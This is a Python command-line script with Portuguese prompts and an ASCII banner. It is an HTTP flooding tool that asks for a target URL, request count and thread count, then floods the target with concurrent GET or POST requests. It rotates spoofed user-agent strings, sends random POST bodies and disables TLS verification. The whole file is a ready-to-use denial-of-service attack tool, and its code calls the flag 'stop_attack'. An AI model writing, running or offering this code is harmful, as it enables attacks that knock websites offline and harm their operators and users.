import requests
import random
import threading
from colorama import init, Fore, Style
import urllib3

init()

intro = f"""{Fore.RED}
            | $$  | $$| $$$ | $$ /$$$$$$$           | $$        
            | $$  | $$| $$$$| $$| $$  \\ _/  /$$$$$$ | $$        
            | $$$$$$$$| $$ $$ $$| $$ /$$$$ /$$__  $$| $$        
            |_____  $$| $$  $$$$| $$|_  $$| $$$$$$$$| $$        
                  | $$| $$\\  $$$| $$  \\ $$| $$_____/| $$        
                  | $$| $$ \\  $$|  $$$$$$/|  $$$$$$$| $$$$$$$$  
                  |__/|__/  \\__/ \\______/  \\_______/|________/ BETA
{Style.RESET_ALL}"""

print(intro)
print("\033[91m")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
    'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
    'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
]

stop_attack = False

def get_random_user_agent():
    return random.choice(user_agents)

def generate_headers():
    return {
        'User-Agent': get_random_user_agent(),
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    }


def slow_get(base_url, num_requests):
    global stop_attack
    for _ in range(num_requests):
        if stop_attack:
            break
        try:
            headers = generate_headers()
            url = base_url
            response = requests.get(url, headers=headers)
            print(f"Solicitação GET enviada para {url}, Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao enviar solicitação GET para {url}: {e}")

def slow_post(base_url, num_requests):
    global stop_attack
    for _ in range(num_requests):
        if stop_attack:
            break
        try:
            headers = generate_headers()
            url = base_url
            payloads = [
                {'param': random.randint(1, 100)},
                {'param1': random.randint(1, 100), 'param2': 'test'},
                {'data': 'some_data', 'info': random.random()}
            ]
            data = random.choice(payloads)
            response = requests.post(url, headers=headers, data=data, verify=False)
            print(f"Solicitação POST enviada para {url}, Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao enviar solicitação POST para {url}: {e}")

def is_valid_url(url):
    if not url.startswith(("http://", "https://")):
        print("A URL deve começar com 'http://' ou 'https://'")
        return False
    return True

def handle_response(response):
    content_type = response.headers.get('Content-Type', '')
    if 'application/json' in content_type:
        try:
            data = response.json()
            print("Resposta em formato JSON:")
            print(data)
        except ValueError:
            print("Resposta não está em formato JSON, mas o Content-Type é application/json.")
            print(response.text)
    elif 'text/html' in content_type:
        print("Resposta em formato HTML:")
        print(response.text)
    elif 'text/plain' in content_type:
        print("Resposta em formato texto:")
        print(response.text)
    else:
        print(f"Resposta com um tipo de conteúdo não reconhecido ({content_type}):")
        print(response.text)

def main():
    base_url = input("Insira o URL: ").strip()
    if not is_valid_url(base_url):
        print("URL inválida")
        return

    num_requests = int(input("Insira o número de solicitações a serem enviadas por thread: "))
    num_threads = int(input("Insira o número de threads: "))
    method = input("Escolha o método HTTP (GET ou POST): ").strip().upper()

    stop_thread = threading.Thread()
    stop_thread.start()

    threads = []
    if method == 'GET':
        for _ in range(num_threads):
            thread = threading.Thread(target=slow_get, args=(base_url, num_requests))
            threads.append(thread)
            thread.start()
    elif method == 'POST':
        for _ in range(num_threads):
            thread = threading.Thread(target=slow_post, args=(base_url, num_requests))
            threads.append(thread)
            thread.start()
    else:
        print("Método HTTP inválido. Escolha GET ou POST.")
        stop_attack = True

    for thread in threads:
        thread.join()

    stop_thread.join()

if __name__ == "__main__":
    main()